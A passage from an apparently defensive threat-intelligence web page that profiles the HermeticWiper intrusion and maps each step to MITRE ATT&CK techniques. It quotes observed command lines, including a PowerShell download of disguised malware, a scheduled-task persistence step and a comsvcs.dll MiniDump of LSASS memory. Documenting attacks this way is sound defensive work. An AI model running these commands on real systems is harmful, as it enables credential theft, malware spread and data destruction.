2&gt;&amp;1</code></td></tr></tbody></table><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="notes"></a>Notes<a class="hash-link" href="#notes" title="Direct link to heading">#</a></h4><ul><li>Patterns in the command-line arguments is consistent with Impackets <em>wmiexec.py</em> script.</li><li><em>Impacket</em> is an open source collection of modules written in Python for programmatically constructing and manipulating network protocols.</li><li><em>Impacket</em> contains several tools for remote service execution, Kerberos manipulation, Windows credential dumping, packet sniffing, and relay attacks.</li><li><a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py" target="_blank" rel="noopener noreferrer">https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py</a></li></ul><h3><a aria-hidden="true" tabindex="-1" class="anchor anchor__h3 anchorWithStickyNavbar_y2LR" id="threat-actor-used-powershell-to-download-malware-masqueraded-as-jpeg-file-from-internal-server-for-lateral-movement"></a>Threat Actor used <em>PowerShell</em> to download malware masqueraded as <em>.jpeg</em> file from <em>internal server</em> for Lateral Movement.<a class="hash-link" href="#threat-actor-used-powershell-to-download-malware-masqueraded-as-jpeg-file-from-internal-server-for-lateral-movement" title="Direct link to heading">#</a></h3><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="tactic-1"></a>Tactic<a class="hash-link" href="#tactic-1" title="Direct link to heading">#</a></h4><ul><li>Lateral Movement</li></ul><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="techniques-1"></a>Techniques<a class="hash-link" href="#techniques-1" title="Direct link to heading">#</a></h4><ul><li>T1570 - Lateral Tool Transfer</li><li>T1059.001 - Command and Scripting Interpreter: PowerShell</li></ul><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="behaviors-and-observables-1"></a>Behaviors and Observables<a class="hash-link" href="#behaviors-and-observables-1" title="Direct link to heading">#</a></h4><table><thead><tr><th>Tech IDs</th><th>Behaviors</th><th>Observables</th></tr></thead><tbody><tr><td>T1570<br>T1059.001</td><td><em>PowerShell</em> downloaded file from <em>internal server</em> to <em>Temp</em> folder.</td><td><em>Process Created</em>: <br>- <code>powershell -c \&quot;(New-Object System.Net.WebClient).DownloadFile(&#x27;hxxp://192.168.3.13/email.jpeg&#x27;,&#x27;CSIDL_SYSTEM_DRIVE\\temp\\sys.tmp1&#x27;)\&quot;&gt; \\\\127.0.0.1\\ADMIN$\__[TIMESTAMP] 2&gt;&amp;1</code></td></tr></tbody></table><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="notes-1"></a>Notes<a class="hash-link" href="#notes-1" title="Direct link to heading">#</a></h4><ul><li>&quot;CSIDL_SYSTEM_DRIVE&quot; is not on the list of recognized environment variables.</li><li><a href="https://docs.microsoft.com/en-us/windows/deployment/usmt/usmt-recognized-environment-variables" target="_blank" rel="noopener noreferrer">https://docs.microsoft.com/en-us/windows/deployment/usmt/usmt-recognized-environment-variables</a></li></ul><h3><a aria-hidden="true" tabindex="-1" class="anchor anchor__h3 anchorWithStickyNavbar_y2LR" id="threat-actor-used-schtasks-to-periodically-create-malicious-file-at-windows-policy-definition-folder-for-persistence"></a>Threat Actor used <em>SCHTASKS</em> to periodically create malicious file at Windows Policy Definition folder for Persistence.<a class="hash-link" href="#threat-actor-used-schtasks-to-periodically-create-malicious-file-at-windows-policy-definition-folder-for-persistence" title="Direct link to heading">#</a></h3><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="tactic-2"></a>Tactic<a class="hash-link" href="#tactic-2" title="Direct link to heading">#</a></h4><ul><li>Persistence</li></ul><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="techniques-2"></a>Techniques<a class="hash-link" href="#techniques-2" title="Direct link to heading">#</a></h4><ul><li>T1053.005 - Scheduled Task/Job: Scheduled Task</li><li>T1059.003 - Command and Scripting Interpreter: Windows Command Shell</li></ul><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="behaviors-and-observables-2"></a>Behaviors and Observables<a class="hash-link" href="#behaviors-and-observables-2" title="Direct link to heading">#</a></h4><table><thead><tr><th>Tech IDs</th><th>Behaviors</th><th>Observables</th></tr></thead><tbody><tr><td>T1053.005</td><td>Scheduled Task executed.</td><td><em>Process Created</em>: <br>- <code>schtasks /run /tn \&quot;\\Microsoft\\Windows\\termsrv\\licensing\\TlsAccess\&quot;</code></td></tr><tr><td>T1059.003<br>T1053.005</td><td><em>CMD move</em> file from <em>Temp</em> folder to Windows Policy Definition folder.</td><td><em>Process Created</em>: <br>- <code>cmd.exe /Q /c move CSIDL_SYSTEM_DRIVE\\temp\\sys.tmp1 CSIDL_WINDOWS\\policydefinitions\\postgresql.exe 1&gt; \\\\127.0.0.1\\ADMIN$\\__1636727589.6007507 2&gt;&amp;1</code></td></tr></tbody></table><h3><a aria-hidden="true" tabindex="-1" class="anchor anchor__h3 anchorWithStickyNavbar_y2LR" id="threat-actor-used-certutil-to-check-internet-connectivity-for-discovery"></a>Threat Actor used <em>CERTUTIL</em> to check internet connectivity for Discovery.<a class="hash-link" href="#threat-actor-used-certutil-to-check-internet-connectivity-for-discovery" title="Direct link to heading">#</a></h3><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="tactic-3"></a>Tactic<a class="hash-link" href="#tactic-3" title="Direct link to heading">#</a></h4><ul><li>Discovery</li></ul><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="techniques-3"></a>Techniques<a class="hash-link" href="#techniques-3" title="Direct link to heading">#</a></h4><ul><li>T1071.001 - Application Layer Protocol: Web Protocols</li></ul><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="behaviors-and-observables-3"></a>Behaviors and Observables<a class="hash-link" href="#behaviors-and-observables-3" title="Direct link to heading">#</a></h4><table><thead><tr><th>Tech IDs</th><th>Behaviors</th><th>Observables</th></tr></thead><tbody><tr><td>T1071.001</td><td>CERTUTIL performed network connections.</td><td><em>DNS Queried</em>: <code>trustsecpro[.]com</code><br><em>DNS Queried</em>: <code>whatismyip[.]com</code></td></tr></tbody></table><h3><a aria-hidden="true" tabindex="-1" class="anchor anchor__h3 anchorWithStickyNavbar_y2LR" id="threat-actor-used-powershell-to-download-additional-malware-masqueraded-as-jpeg-file-from-external-server-for-command-and-control"></a>Threat Actor used <em>PowerShell</em> to download additional malware masqueraded as <em>jpeg</em> file from external server for Command And Control.<a class="hash-link" href="#threat-actor-used-powershell-to-download-additional-malware-masqueraded-as-jpeg-file-from-external-server-for-command-and-control" title="Direct link to heading">#</a></h3><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="tactic-4"></a>Tactic<a class="hash-link" href="#tactic-4" title="Direct link to heading">#</a></h4><ul><li>Command And Control</li></ul><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="techniques-4"></a>Techniques<a class="hash-link" href="#techniques-4" title="Direct link to heading">#</a></h4><ul><li>T1071.001 - Application Layer Protocol: Web Protocols</li></ul><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="behaviors-and-observables-4"></a>Behaviors and Observables<a class="hash-link" href="#behaviors-and-observables-4" title="Direct link to heading">#</a></h4><table><thead><tr><th>Tech IDs</th><th>Behaviors</th><th>Observables</th></tr></thead><tbody><tr><td>T1071.001</td><td><em>PowerShell</em> performed network connections.</td><td><em>DNS Queried</em>: <code>confluence.novus[.]ua</code></td></tr></tbody></table><h3><a aria-hidden="true" tabindex="-1" class="anchor anchor__h3 anchorWithStickyNavbar_y2LR" id="threat-actor-used-com-service-dll-to-dump-lsass-process-memory-via-rundll32-and-powershell-for-credential-access"></a>Threat Actor used <em>COM+ Service DLL</em> to dump <em>LSASS</em> process memory via <em>RunDll32</em> and <em>PowerShell</em> for Credential Access.<a class="hash-link" href="#threat-actor-used-com-service-dll-to-dump-lsass-process-memory-via-rundll32-and-powershell-for-credential-access" title="Direct link to heading">#</a></h3><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="tactic-5"></a>Tactic<a class="hash-link" href="#tactic-5" title="Direct link to heading">#</a></h4><ul><li>Credential Access</li></ul><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="techniques-5"></a>Techniques<a class="hash-link" href="#techniques-5" title="Direct link to heading">#</a></h4><ul><li>T1059.003 - Command and Scripting Interpreter: Windows Command Shell</li><li>T1059.001 - Command and Scripting Interpreter: PowerShell</li><li>T1218.011 - Signed Binary Proxy Execution: Rundll32</li><li>T1003.001 - OS Credential Dumping: LSASS Memory</li></ul><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="behaviors-and-observables-5"></a>Behaviors and Observables<a class="hash-link" href="#behaviors-and-observables-5" title="Direct link to heading">#</a></h4><table><thead><tr><th>Tech IDs</th><th>Behaviors</th><th>Observables</th></tr></thead><tbody><tr><td>T1059.003</td><td><em>CMD</em> executions with <em>Impacket</em> patterns in command-line.</td><td><em>Process Created</em>: <br>- <code>cmd.exe /Q /c powershell -c \&quot;rundll32 C:\\windows\\system32\\comsvcs.dll MiniDump 600 C:\\asm\\appdata\\local\\microsoft\\windows\\winupd.log full\&quot; 1&gt; \\127.0.0.1\ADMIN$\__1638457529.1247072 2&gt;&amp;1</code></td></tr><tr><td>T1059.001<br>T1218.011</td><td><em>PowerShell</em> launched <em>RunDll32</em>.</td><td><em>Process Created</em>: <br>- <code>powershell -c \&quot;rundll32 C:\\windows\\system32\\comsvcs.dll MiniDump 600 C:\\asm\\appdata\\local\\microsoft\\windows\\winupd.log full\&quot;</code></td></tr><tr><td>T1003.001<br>T1059.001<br>T1218.011</td><td><em>RunDll32</em> launched <em>COM+ Services DLL</em> (comsvcs.dll) to create a process memory dump.</td><td><em>Process Created</em>: <br>- <code>rundll32 C:\\windows\\system32\\comsvcs.dll MiniDump 600 C:\\asm\\appdata\\local\\microsoft\\windows\\winupd.log full</code></td></tr></tbody></table><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="notes-2"></a>Notes<a class="hash-link" href="#notes-2" title="Direct link to heading">#</a></h4><ul><li><em>comsvcs.dll</em> is the <em>COM+ Service DLL</em> in Windows.</li><li><em>comsvcs.dll MimiDump</em> method is used to create processes memory dumps.</li><li>The target process is provided as argument; in this case is pId = 600.</li><li>Using <em>comsvcs.dll MimiDump</em> for creating LSASS process memory dumps is a known trick.</li></ul><h3><a aria-hidden="true" tabindex="-1" class="anchor anchor__h3 anchorWithStickyNavbar_y2LR" id="hermeticwiper-used-valid-digital-signatures-to-undermine-security-controls-for-defense-evasion"></a>HermeticWiper used <em>valid digital signatures</em> to undermine security controls for Defense Evasion.<a class="hash-link" href="#hermeticwiper-used-valid-digital-signatures-to-undermine-security-controls-for-defense-evasion" title="Direct link to heading">#</a></h3><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="tactic-6"></a>Tactic<a class="hash-link" href="#tactic-6" title="Direct link to heading">#</a></h4><ul><li>Defense Evasion</li></ul><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="techniques-6"></a>Techniques<a class="hash-link" href="#techniques-6" title="Direct link to heading">#</a></h4><ul><li>T1553.002 - Subvert Trust Controls: Code Signing</li></ul><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="behaviors-and-observables-6"></a>Behaviors and Observables<a class="hash-link" href="#behaviors-and-observables-6" title="Direct link to heading">#</a></h4><table><thead><tr><th>Tech IDs</th><th>Behaviors</th><th>Observables</th></tr></thead><tbody><tr><td>T1553.002</td><td>Malware was signed with valid Certificate.</td><td><em>File Created</em>: <br>- <code>*\\#{binaryName}.exe</code></td></tr></tbody></table><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="notes-3"></a>Notes<a class="hash-link" href="#notes-3" title="Direct link to heading">#</a></h4><ul><li>Code signing provides a level of authenticity on a binary from the developer.</li></ul><h3><a aria-hidden="true" tabindex="-1" class="anchor anchor__h3 anchorWithStickyNavbar_y2LR" id="hermeticwiper-used-embedded-resources-to-stage-easeus-partition-master-drivers-for-defense-evasion"></a>HermeticWiper used <em>embedded resources</em> to stage <em>EaseUS Partition Master</em> drivers for Defense Evasion.<a class="hash-link" href="#hermeticwiper-used-embedded-resources-to-stage-easeus-partition-master-drivers-for-defense-evasion" title="Direct link to heading">#</a></h3><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="tactic-7"></a>Tactic<a class="hash-link" href="#tactic-7" title="Direct link to heading">#</a></h4><ul><li>Defense Evasion</li></ul><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="techniques-7"></a>Techniques<a class="hash-link" href="#techniques-7" title="Direct link to heading">#</a></h4><ul><li>T1140 - Deobfuscate/Decode Files or Information</li></ul><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="behaviors-and-observables-7"></a>Behaviors and Observables<a class="hash-link" href="#behaviors-and-observables-7" title="Direct link to heading">#</a></h4><table><thead><tr><th>Tech IDs</th><th>Behaviors</th><th>Observables</th></tr></thead><tbody><tr><td>T1140</td><td>Files created at <em>Windows Driver</em> folder with partially randomized file names.</td><td><em>File Created</em>: <br>- <code>C:\\Windows\\System32\\drivers\\fndr.sys</code><br>- <code>C:\\Windows\\System32\\drivers\\njdr.sys</code></td></tr></tbody></table><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="notes-4"></a>Notes<a class="hash-link" href="#notes-4" title="Direct link to heading">#</a></h4><ul><li>4 versions of the drivers are included in the resources.</li><li>The drivers are compressed using the <em>MSLZ</em> format.</li><li>Only one driver is written to disk with partially randomized file name.</li><li>File name follows the pattern: &quot;[a-z]{2}dr.sys&quot;</li></ul><h3><a aria-hidden="true" tabindex="-1" class="anchor anchor__h3 anchorWithStickyNavbar_y2LR" id="hermeticwiper-used-native-apis-to-execute-the-drivers-as-a-windows-service-for-execution"></a>HermeticWiper used <em>Native APIs</em> to execute the drivers as a <em>Windows Service</em> for Execution.<a class="hash-link" href="#hermeticwiper-used-native-apis-to-execute-the-drivers-as-a-windows-service-for-execution" title="Direct link to heading">#</a></h3><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="tactic-8"></a>Tactic<a class="hash-link" href="#tactic-8" title="Direct link to heading">#</a></h4><ul><li>Execution</li></ul><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="techniques-8"></a>Techniques<a class="hash-link" href="#techniques-8" title="Direct link to heading">#</a></h4><ul><li>T1106 - Native API</li><li>T1543 - Create or Modify System Process: Windows Service</li><li>T1569.002 - System Services: Service Execution</li><li>T1112 - Modify Registry</li></ul><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="behaviors-and-observables-8"></a>Behaviors and Observables<a class="hash-link" href="#behaviors-and-observables-8" title="Direct link to heading">#</a></h4><table><thead><tr><th>Tech IDs</th><th>Behaviors</th><th>Observables</th></tr></thead><tbody><tr><td>T1106<br>T1543<br>T1569.002</td><td><em>Native APIs</em> calls (<em>OpenSCManagerW</em>, <em>OpenServiceW</em>, <em>CreateServiceW</em> and <em>StartServiceW</em>) to create a <em>Windows Service</em>.</td><td></td></tr><tr><td>T1112<br>T1543</td><td><em>Windows Registry</em> modification for new service.</td><td><em>RegValue Created</em>: <code>HKLM\\SYSTEM\\CurrentControlSet\\services\\#[a-z]{2}dr</code></td></tr></tbody></table><h3><a aria-hidden="true" tabindex="-1" class="anchor anchor__h3 anchorWithStickyNavbar_y2LR" id="hermeticwiper-used-adjusttokenprivileges-native-api-to-give-itself-seloaddriverprivilege-seshutdownprivilege-and-sebackupprivilege-privileges-for-privilege-escalation"></a>HermeticWiper used <em>AdjustTokenPrivileges</em> Native API to give itself <em>SeLoadDriverPrivilege</em>, <em>SeShutDownPrivilege</em> and <em>SeBackupPrivilege</em> privileges for Privilege Escalation.<a class="hash-link" href="#hermeticwiper-used-adjusttokenprivileges-native-api-to-give-itself-seloaddriverprivilege-seshutdownprivilege-and-sebackupprivilege-privileges-for-privilege-escalation" title="Direct link to heading">#</a></h3><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="tactic-9"></a>Tactic<a class="hash-link" href="#tactic-9" title="Direct link to heading">#</a></h4><ul><li>Privilege Escalation</li></ul><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="techniques-9"></a>Techniques<a class="hash-link" href="#techniques-9" title="Direct link to heading">#</a></h4><ul><li>T1106 - Native API</li><li>T1134 - Access Token Manipulation</li></ul><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="behaviors-and-observables-9"></a>Behaviors and Observables<a class="hash-link" href="#behaviors-and-observables-9" title="Direct link to heading">#</a></h4><table><thead><tr><th>Tech IDs</th><th>Behaviors</th><th>Observables</th></tr></thead><tbody><tr><td>T1106<br>T1134</td><td><em>Native APIs</em> to increase privilege</td><td></td></tr></tbody></table><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="notes-5"></a>Notes<a class="hash-link" href="#notes-5" title="Direct link to heading">#</a></h4><ul><li>An access token is a type of object that describes the security context of a process or thread, and is assigned to all processes created in the system.</li><li><em>SeLoadDriverPrivilege</em>: Allows to Load and unload device drivers. The activation of this policy in the context of non-privileged users implies a significant risk due to the possibility of executing code in kernel space.</li><li><em>SeShutDownPrivilege</em>: Allows to shutdown local system. Ransomware and wipers might rely on this for larger impact.</li><li><em>SeBackupPrivilege</em>: Allows to read files even when such right is not specified on the Access Control List. Ransomware and wipers might rely on this for larger impact.</li><li><a href="https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/" target="_blank" rel="noopener noreferrer">https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/</a></li><li><a href="https://grzegorztworek.medium.com/ive-got-the-power-4f44b1998c88" target="_blank" rel="noopener noreferrer">https://grzegorztworek.medium.com/ive-got-the-power-4f44b1998c88</a></li></ul><h3><a aria-hidden="true" tabindex="-1" class="anchor anchor__h3 anchorWithStickyNavbar_y2LR" id="hermeticwiper-used-native-apis-to-stop-the-volume-shadow-copy-service-for-impact"></a>HermeticWiper used <em>Native APIs</em> to stop the Volume Shadow Copy Service for Impact.<a class="hash-link" href="#hermeticwiper-used-native-apis-to-stop-the-volume-shadow-copy-service-for-impact" title="Direct link to heading">#</a></h3><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="tactic-10"></a>Tactic<a class="hash-link" href="#tactic-10" title="Direct link to heading">#</a></h4><ul><li>Impact</li></ul><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="techniques-10"></a>Techniques<a class="hash-link" href="#techniques-10" title="Direct link to heading">#</a></h4><ul><li>T1106 - Native API</li><li>T1490 - Inhibit System Recovery</li></ul><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="behaviors-and-observables-10"></a>Behaviors and Observables<a class="hash-link" href="#behaviors-and-observables-10" title="Direct link to heading">#</a></h4><table><thead><tr><th>Tech IDs</th><th>Behaviors</th><th>Observables</th></tr></thead><tbody><tr><td>T1106<br>T1490</td><td><em>Native APIs</em> to stop VSS service.</td><td></td></tr></tbody></table><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="notes-6"></a>Notes<a class="hash-link" href="#notes-6" title="Direct link to heading">#</a></h4><ul><li>The VSS service creates incremental back-ups over time. It&#x27;s is often disabled by ransomware and wipers.</li><li>An alternative method is to use <em>SC.EXE</em> to disable VSS service.</li></ul><h3><a aria-hidden="true" tabindex="-1" class="anchor anchor__h3 anchorWithStickyNavbar_y2LR" id="hermeticwiper-used-easeus-partition-master-drivers-for-direct-access-to-storage-devices-to-overwrite-files-for-impact"></a>HermeticWiper used <em>EaseUS Partition Master</em> drivers for direct access to storage devices to overwrite files for Impact.<a class="hash-link" href="#hermeticwiper-used-easeus-partition-master-drivers-for-direct-access-to-storage-devices-to-overwrite-files-for-impact" title="Direct link to heading">#</a></h3><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="tactic-11"></a>Tactic<a class="hash-link" href="#tactic-11" title="Direct link to heading">#</a></h4><ul><li>Impact</li></ul><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="techniques-11"></a>Techniques<a class="hash-link" href="#techniques-11" title="Direct link to heading">#</a></h4><ul><li>T1561.002 - Disk Structure Wipe</li><li>T1561.001 - Disk Content Wipe</li></ul><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="behaviors-and-observables-11"></a>Behaviors and Observables<a class="hash-link" href="#behaviors-and-observables-11" title="Direct link to heading">#</a></h4><table><thead><tr><th>Tech IDs</th><th>Behaviors</th><th>Observables</th></tr></thead><tbody><tr><td>T1561.002</td><td>Malware iterates from <em>PhysicalDrive0</em> to <em>PhysicalDrive100</em> to overwrite <em>MBR</em>.</td><td></td></tr><tr><td>T1561.001</td><td>Malware overwrites files under specific folders with random data.</td><td></td></tr></tbody></table><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="notes-7"></a>Notes<a class="hash-link" href="#notes-7" title="Direct link to heading">#</a></h4><ul><li>Target folders: C:\Documents and Settings\, C:\System Volume Information\, C:\Windows\SYSVOL\, C:\Windows\System32\winevt\Logs, C:\Windows\System32\winevt\Logs</li></ul><h3><a aria-hidden="true" tabindex="-1" class="anchor anchor__h3 anchorWithStickyNavbar_y2LR" id="hermeticwiper-used-initiatesystemshutdownex-native-api-to-shutdown-the-system-for-impact"></a>HermeticWiper used <em>InitiateSystemShutdownEx</em> Native API to shutdown the system for Impact.<a class="hash-link" href="#hermeticwiper-used-initiatesystemshutdownex-native-api-to-shutdown-the-system-for-impact" title="Direct link to heading">#</a></h3><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="tactic-12"></a>Tactic<a class="hash-link" href="#tactic-12" title="Direct link to heading">#</a></h4><ul><li>Impact</li></ul><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="techniques-12"></a>Techniques<a class="hash-link" href="#techniques-12" title="Direct link to heading">#</a></h4><ul><li>T1106 - Native API</li><li>T1529 - System Shutdown/Reboot</li></ul><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="behaviors-and-observables-12"></a>Behaviors and Observables<a class="hash-link" href="#behaviors-and-observables-12" title="Direct link to heading">#</a></h4><table><thead><tr><th>Tech IDs</th><th>Behaviors</th><th>Observables</th></tr></thead><tbody><tr><td>T1106<br>T1529</td><td><em>Native APIs</em> to increase privilege</td><td></td></tr></tbody></table><h4><a aria-hidden="true" tabindex="-1" class="anchor anchor__h4 anchorWithStickyNavbar_y2LR" id="notes-8"></a>Notes<a class="hash-link" href="#notes-8" title="Direct link to heading">#</a></h4><ul><li>This API requires <em>SeShutDownPrivilege</em> privilege.</li></ul></div></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="Docs pages navigation"><div class="pagination-nav__item"><a class="pagination-nav__link" href="/ac3-threat-sightings/docs/Sightings/UNK-Phishing"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">Â« UNK-Phishing</div></a></div><div class="pagination-nav__item pagination-nav__item--next"><a class="pagination-nav__link" href="/ac3-threat-sightings/docs/Sightings/WhisperGate"><div class="pagination-nav__sublabel">Next</div><div class="pagination-nav__label">WhisperGate Â»</div></a></div></nav></div></div><div class="col col--3"><div class="tableOfContents_vrFS thin-scrollbar"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#overview" class="table-of-contents__link">Overview</a><ul><li><a href="#references" class="table-of-contents__link">References:</a></li><li><a href="#threat-actor-activity" class="table-of-contents__link">Threat Actor Activity</a></li><li><a href="#count-of-documented-ttps-by-tactic" class="table-of-contents__link">Count of documented TTPs by Tactic</a></li><li><a href="#attack-flow" class="table-of-contents__link">Attack Flow</a></li></ul></li><li><a href="#tactics-techniques-and-procedures" class="table-of-contents__link">Tactics, Techniques and Procedures</a></li><li><a href="#tactics-techniques-procedures-observables-and-notes" class="table-of-contents__link">Tactics, Techniques, Procedures, Observables and Notes</a></li><li><a href="#ttp-profiles-with-observables" class="table-of-contents__link">TTP Profiles with Observables</a><ul><li><a href="#threat-actor-used-likely-wmi-and-impacket-to-execute-cmd-commands-on-victim-endpoints-for-command-and-control" class="table-of-contents__link">Threat Actor used likely <em>WMI</em> and <em>Impacket</em> to execute <em>CMD</em> commands on victim endpoints for Command And Control.</a></li><li><a href="#threat-actor-used-powershell-to-download-malware-masqueraded-as-jpeg-file-from-internal-server-for-lateral-movement" class="table-of-contents__link">Threat Actor used <em>PowerShell</em> to download malware masqueraded as <em>.jpeg</em> file from <em>internal server</em> for Lateral Movement.</a></li><li><a href="#threat-actor-used-schtasks-to-periodically-create-malicious-file-at-windows-policy-definition-folder-for-persistence" class="table-of-contents__link">Threat Actor used <em>SCHTASKS</em> to periodically create malicious file at Windows Policy Definition folder for Persistence.</a></li><li><a href="#threat-actor-used-certutil-to-check-internet-connectivity-for-discovery" class="table-of-contents__link">Threat Actor used <em>CERTUTIL</em> to check internet connectivity for Discovery.</a></li><li><a href="#threat-actor-used-powershell-to-download-additional-malware-masqueraded-as-jpeg-file-from-external-server-for-command-and-control" class="table-of-contents__link">Threat Actor used <em>PowerShell</em> to download additional malware masqueraded as <em>jpeg</em> file from external server for Command And Control.</a></li><li><a href="#threat-actor-used-com-service-dll-to-dump-lsass-process-memory-via-rundll32-and-powershell-for-credential-access" class="table-of-contents__link">Threat Actor used <em>COM+ Service DLL</em> to dump <em>LSASS</em> process memory via <em>RunDll32</em> and <em>PowerShell</em> for Credential Access.</a></li><li><a href="#hermeticwiper-used-valid-digital-signatures-to-undermine-security-controls-for-defense-evasion" class="table-of-contents__link">HermeticWiper used <em>valid digital signatures</em> to undermine security controls for Defense Evasion.</a></li><li><a href="#hermeticwiper-used-embedded-resources-to-stage-easeus-partition-master-drivers-for-defense-evasion" class="table-of-contents__link">HermeticWiper used <em>embedded resources</em> to stage <em>EaseUS Partition Master</em> drivers for Defense Evasion.</a></li><li><a href="#hermeticwiper-used-native-apis-to-execute-the-drivers-as-a-windows-service-for-execution" class="table-of-contents__link">HermeticWiper used <em>Native APIs</em> to execute the drivers as a <em>Windows Service</em> for Execution.</a></li><li><a href="#hermeticwiper-used-adjusttokenprivileges-native-api-to-give-itself-seloaddriverprivilege-seshutdownprivilege-and-sebackupprivilege-privileges-for-privilege-escalation" class="table-of-contents__link">HermeticWiper used <em>AdjustTokenPrivileges</em> Native API to give itself <em>SeLoadDriverPrivilege</em>, <em>SeShutDownPrivilege</em> and <em>SeBackupPrivilege</em> privileges for Privilege Escalation.</a></li><li><a href="#hermeticwiper-used-native-apis-to-stop-the-volume-shadow-copy-service-for-impact" class="table-of-contents__link">HermeticWiper used <em>Native APIs</em> to stop the Volume Shadow Copy Service for Impact.</a></li><li><a href="#hermeticwiper-used-easeus-partition-master-drivers-for-direct-access-to-storage-devices-to-overwrite-files-for-impact" class="table-of-contents__link">HermeticWiper used <em>EaseUS Partition Master</em> drivers for direct access to storage devices to overwrite files for Impact.</a></li><li><a href="#hermeticwiper-used-initiatesystemshutdownex-native-api-to-shutdown-the-system-for-impact" class="table-of-contents__link">HermeticWiper used <em>InitiateSystemShutdownEx</em> Native API to shutdown the system for Impact.</a></li></ul></li></ul></div></div></div></div></main></div></div></div>
<script src="/ac3-threat-sightings/assets/js/runtime~main.c07ad03c.js"></script>
<script src="/ac3-threat-sightings/assets/js/main.a21a4089.js"></script>
</body>
</html>